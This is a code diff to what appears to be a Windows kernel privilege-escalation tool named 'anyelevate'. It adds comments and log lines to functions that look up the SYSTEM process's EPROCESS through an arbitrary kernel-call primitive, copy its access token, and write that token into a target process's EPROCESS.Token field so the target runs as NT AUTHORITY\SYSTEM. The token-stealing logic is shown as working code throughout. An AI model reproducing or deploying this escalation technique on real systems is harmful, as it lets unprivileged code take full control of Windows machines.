@@ -68,6 +68,9 @@ namespace anyelevate
 	{
 		NTSTATUS nt_status = STATUS_SUCCESS;
 
+		//
+		// lookup PEPROCESS of sytstem process by PID
+		//
 		nt_status =
 			ANYCALL_INVOKE( PsLookupProcessByProcessId, 
 				( HANDLE )SYSTEM_PROCESS_PID, &system_process );
@@ -81,6 +84,9 @@ namespace anyelevate
 		printf( "[+] PEPROCESS of system process @ %p\n", system_process );
 		printf( "[~] snatching token...\n" );
 
+		//
+		// copy system process's token from ntoskrnl to our buffer
+		//
 		kernel::memcpy( 
 			&system_process_token, 
 			( void* )(( uint64_t )system_process + RVA_PEPROCESS_TOKEN ), 
@@ -93,6 +99,8 @@ namespace anyelevate
 		if ( !system_process_token.Object )
 			return false;
 
+		printf( "[+] snatched!\n" );
+
 		PRINT_WHOAMI();
 
 		return true;
@@ -100,11 +108,14 @@ namespace anyelevate
 
 	bool elevate( const uint32_t process_id )
 	{
-		NTSTATUS nt_status;
+		NTSTATUS nt_status = STATUS_SUCCESS;
 		PEPROCESS process;
 
 		printf( "[+] snatching PEPROCESS of PID %d\n", process_id );
 
+		//
+		// lookup PEPROCESS of desired process
+		//
 		nt_status =
 			ANYCALL_INVOKE( PsLookupProcessByProcessId,
 				( HANDLE )process_id, &process );
@@ -118,6 +129,10 @@ namespace anyelevate
 
 		printf( "[~] maniplating token of PID %d\n", process_id );
 
+		//
+		// copy system process's token from our buffer to
+		// nt!_EPROCESS.Token of desired process
+		//
 		kernel::memcpy(
 			( void* )( ( uint64_t )process + RVA_PEPROCESS_TOKEN ),
 			&system_process_token,
@@ -125,6 +140,10 @@ namespace anyelevate
 
 		printf( "[+] manipulated!\n" );
 
+		//
+		// if success, this should print `SYSTEM`
+		// which means `NT AUTHORITY\SYSTEM`
+		//
 		PRINT_WHOAMI();
 
 		printf( "[+] done\n" );
